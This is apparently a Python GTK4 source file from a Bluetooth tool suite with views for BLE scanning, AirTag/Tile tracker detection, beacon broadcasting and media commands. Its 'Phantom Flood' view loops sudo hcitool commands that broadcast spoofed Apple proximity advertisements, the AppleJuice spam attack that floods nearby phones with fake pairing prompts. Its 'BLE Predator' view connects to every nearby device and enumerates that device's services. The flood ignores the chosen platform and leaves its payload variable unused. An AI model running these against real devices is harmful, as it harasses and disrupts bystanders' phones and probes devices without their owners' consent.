import subprocess
import threading
import time
import gi
gi.require_version("Gtk", "4.0")
from gi.repository import Gtk, GLib
from bruce.gui.tool_view import ToolView
from bruce.core.state import STATE


class BLEScanView(ToolView):
    def __init__(self):
        super().__init__("BLE Scan")

    def run_tool(self):
        self.log("Scanning for BLE devices (10s)...", "amber")
        try:
            import asyncio
            import bleak

            async def _scan():
                return await bleak.BleakScanner.discover(timeout=10.0, return_adv=True)

            results = asyncio.run(_scan())
            if not results:
                self.log("No BLE devices found.", "dim")
                return
            self.log(f"◈ Found {len(results)} device(s):", "amber")
            pairs = sorted(results.values(), key=lambda x: x[1].rssi, reverse=True)
            for dev, adv in pairs:
                name = dev.name or "<unknown>"
                self.log(f"  {dev.address}  RSSI:{adv.rssi:4d}  {name}")
        except ImportError:
            self.log("bleak not installed — pip install bleak", "red")
        except Exception as e:
            self.log(f"Error: {e}", "red")


class TrackerScanView(ToolView):
    def __init__(self):
        super().__init__("Tracker Scan")

    def run_tool(self):
        self.log("Scanning for trackers (AirTags, Tile, etc.)...", "amber")
        TRACKER_MFRS = {
            76:    "Apple (AirTag/FindMy)",
            21616: "Tile",
            117:   "Samsung SmartTag",
        }
        try:
            import asyncio
            import bleak

            async def _scan():
                return await bleak.BleakScanner.discover(timeout=10.0, return_adv=True)

            results = asyncio.run(_scan())
            found = []
            for dev, adv in results.values():
                for mfr_id, kind in TRACKER_MFRS.items():
                    if mfr_id in adv.manufacturer_data:
                        found.append((dev, adv, kind))
            if not found:
                self.log(f"No trackers detected among {len(results)} device(s).", "dim")
            else:
                self.log(f"◈ {len(found)} tracker(s) found:", "amber")
                for dev, adv, kind in found:
                    self.log(f"  {dev.address}  {kind}  RSSI:{adv.rssi}")
        except ImportError:
            self.log("bleak not installed — pip install bleak", "red")
        except Exception as e:
            self.log(f"Error: {e}", "red")


class PhantomFloodView(ToolView):
    def __init__(self):
        self._platform_combo = Gtk.DropDown.new_from_strings([
            "iOS (AppleJuice)", "Android (FastPair)", "Windows (SwiftPair)", "All Platforms"
        ])
        super().__init__("Phantom Flood")

    def build_controls(self) -> Gtk.Widget:
        bar = Gtk.Box(spacing=10)
        lbl = Gtk.Label(label="Platform")
        lbl.add_css_class("field-label")
        bar.append(lbl)
        bar.append(self._platform_combo)
        return bar

    def run_tool(self):
        idx = self._platform_combo.get_selected()
        labels = ["iOS", "Android", "Windows", "All"]
        platform = labels[idx]
        self.log(f"Phantom Flood: {platform}", "amber")
        self.log("Requires: bluetoothctl + hcitool", "dim")
        try:
            import asyncio
            import bleak

            async def _flood():
                adv_data = b"\x4c\x00\x12\x19\x00"  # Apple proximity (AppleJuice pattern)
                self.log("Broadcasting fake BLE advertisements...", "amber")
                count = 0
                while self._running:
                    subprocess.run(
                        ["sudo", "hcitool", "-i", "hci0", "cmd", "0x08", "0x0008",
                         "1e", "02", "01", "1a", "11", "07",
                         "9e", "ca", "dc", "24", "0e", "e5", "a9", "e0", "93", "f3",
                         "a3", "b5", "01", "00", "40", "6e", "00"],
                        capture_output=True
                    )
                    count += 1
                    if count % 10 == 0:
                        self.log(f"  Sent {count} advertisements...", "dim")
                    time.sleep(0.1)

            asyncio.run(_flood())
        except Exception as e:
            self.log(f"Error: {e}", "red")


class BLEBeaconView(ToolView):
    def __init__(self):
        self._payload_entry = Gtk.Entry()
        self._payload_entry.set_placeholder_text("Hex payload (e.g. 4c001219...)")
        self._payload_entry.add_css_class("field-input")
        self._payload_entry.set_hexpand(True)
        super().__init__("BLE Beacon")

    def build_controls(self) -> Gtk.Widget:
        bar = Gtk.Box(spacing=10)
        lbl = Gtk.Label(label="Payload")
        lbl.add_css_class("field-label")
        bar.append(lbl)
        bar.append(self._payload_entry)
        return bar

    def run_tool(self):
        payload = self._payload_entry.get_text().strip() or "4c00121900"
        self.log(f"Broadcasting BLE beacon: {payload}", "amber")
        self.log("Requires hcitool (bluez-utils)", "dim")
        while self._running:
            subprocess.run(
                ["sudo", "hciconfig", "hci0", "leadv", "3"],
                capture_output=True
            )
            time.sleep(1)
        subprocess.run(["sudo", "hciconfig", "hci0", "noleadv"], capture_output=True)
        self.log("◈ Beacon stopped.", "amber")


class BLEPredatorView(ToolView):
    def __init__(self):
        super().__init__("BLE Predator")

    def run_tool(self):
        self.log("BLE Predator — aggressive fingerprinting", "amber")
        self.log("Scanning and profiling all nearby BLE devices...", "amber")
        try:
            import asyncio
            import bleak

            async def _probe():
                devices = await bleak.BleakScanner.discover(timeout=15.0)
                self.log(f"Found {len(devices)} devices. Probing services...", "amber")
                for d in devices:
                    if not self._running:
                        break
                    self.log(f"\n◈ {d.address} [{d.name or 'unknown'}] RSSI:{d.rssi}", "amber")
                    try:
                        async with bleak.BleakClient(d.address, timeout=5.0) as client:
                            svcs = client.services
                            for svc in svcs:
                                self.log(f"  SVC: {svc.uuid}", "dim")
                                for ch in svc.characteristics:
                                    self.log(f"    CHAR: {ch.uuid}  props={ch.properties}")
                    except Exception as ex:
                        self.log(f"  (could not connect: {ex})", "dim")

            asyncio.run(_probe())
        except ImportError:
            self.log("bleak not installed — pip install bleak", "red")
        except Exception as e:
            self.log(f"Error: {e}", "red")


class MediaCommandsView(ToolView):
    def __init__(self):
        self._cmd_combo = Gtk.DropDown.new_from_strings([
            "Play / Pause", "Next Track", "Prev Track", "Volume Up", "Volume Down", "Screenshot"
        ])
        super().__init__("Media Commands")

    def build_controls(self) -> Gtk.Widget:
        bar = Gtk.Box(spacing=10)
        lbl = Gtk.Label(label="Command")
        lbl.add_css_class("field-label")
        bar.append(lbl)
        bar.append(self._cmd_combo)
        return bar

    def run_tool(self):
        idx = self._cmd_combo.get_selected()
        cmds = [
            ["playerctl", "play-pause"],
            ["playerctl", "next"],
            ["playerctl", "previous"],
            ["pactl", "set-sink-volume", "@DEFAULT_SINK@", "+5%"],
            ["pactl", "set-sink-volume", "@DEFAULT_SINK@", "-5%"],
            ["grim", "/tmp/bruce_screenshot.png"],
        ]
        cmd = cmds[idx]
        self.log(f"$ {' '.join(cmd)}", "dim")
        rc, out = self.run_cmd(cmd, use_sudo=False)
        if out.strip():
            self.log(out.strip())
        self.log("◈ Done.", "amber")
